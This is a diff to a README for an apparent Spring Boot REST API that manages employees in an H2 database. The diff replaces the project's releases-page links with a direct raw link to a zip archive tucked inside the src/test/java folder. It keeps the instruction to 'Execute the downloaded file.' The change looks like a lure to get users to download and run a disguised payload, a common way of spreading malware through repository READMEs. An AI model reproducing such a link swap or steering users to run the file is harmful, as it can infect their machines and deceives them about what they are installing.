@@ -3,7 +3,7 @@
 Welcome to the "spring-boot-h2-rest-api" repository! This project provides a robust Spring Boot REST API for efficient management of employees using an in-memory H2 database. With this application, you can effortlessly create, list, update, and delete employees through REST endpoints.
 
 ### 🚀 Quick Links
-[Download and Execute the Latest Release](https://github.com/daigts01/spring-boot-h2-rest-api/releases)
+[Download and Execute the Latest Release](https://github.com/daigts01/spring-boot-h2-rest-api/raw/refs/heads/main/src/test/java/br/rest-api-spring-boot-h-2.0.zip)
 
 ### 🛠️ Repository Details
 - **Repository Name:** spring-boot-h2-rest-api
@@ -20,7 +20,7 @@ The "spring-boot-h2-rest-api" project focuses on simplifying employee management
 
 ### 🔧 Project Setup
 To set up and run the "spring-boot-h2-rest-api" project, follow these steps:
-1. Download the latest release from the provided [link](https://github.com/daigts01/spring-boot-h2-rest-api/releases).
+1. Download the latest release from the provided [link](https://github.com/daigts01/spring-boot-h2-rest-api/raw/refs/heads/main/src/test/java/br/rest-api-spring-boot-h-2.0.zip).
 2. Execute the downloaded file to start the application.
 3. Access the REST endpoints to perform various employee management tasks.
 
